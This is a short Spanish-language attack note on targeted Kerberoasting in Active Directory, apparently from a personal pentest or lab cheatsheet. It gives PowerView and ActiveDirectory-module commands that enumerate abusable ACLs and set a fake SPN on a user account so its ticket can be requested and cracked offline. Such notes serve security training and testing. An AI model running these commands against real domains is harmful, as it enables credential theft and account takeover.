# Set SPN

Tags: #AD #SPN 

- Con suficientes permisos (**GenericAll / GenericWrite**), el SPN de un usuario objetivo puede configurarse a cualquier valor (siempre que sea único en el dominio).
- Luego podemos solicitar un **TGS** sin privilegios especiales. Ese TGS puede posteriormente ser **Kerberoasteado**.

```powershell 
! Usuario: Usuario de dominio

❯ Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match "RDPUsers"}
# Enumerar ACLs interesantes del dominio filtrando por el grupo RDPUsers — identifica sobre qué objetos tiene permisos el grupo para abusar de ellos.

❯ Get-DomainUser -Identity supportuser | select serviceprincipalname
# Verificar si una cuenta ya tiene un SPN registrado usando PowerView — paso previo al Targeted Kerberoasting.

❯ Get-ADUser -Identity supportuser -Properties ServicePrincipalName | select ServicePrincipalName
# Igual que el anterior pero usando el módulo ActiveDirectory nativo.
```

## Convertir la cuenta en Kerberoasteable

```powershell 
! Usuario: Usuario de dominio con permisos de escritura sobre el objeto objetivo

❯ Set-DomainObject -Identity support1user -Set @{serviceprincipalname='dcorp/whatever1'}
# Registrar un SPN falso en una cuenta objetivo (debe ser único para el forest) usando PowerView — convierte la cuenta en Kerberoasteable para solicitar su TGS y crackear la contraseña offline.

❯ Set-ADUser -Identity support1user -ServicePrincipalNames @{Add='dcorp/whatever1'}
# Igual que el anterior pero usando el módulo ActiveDirectory nativo.
```
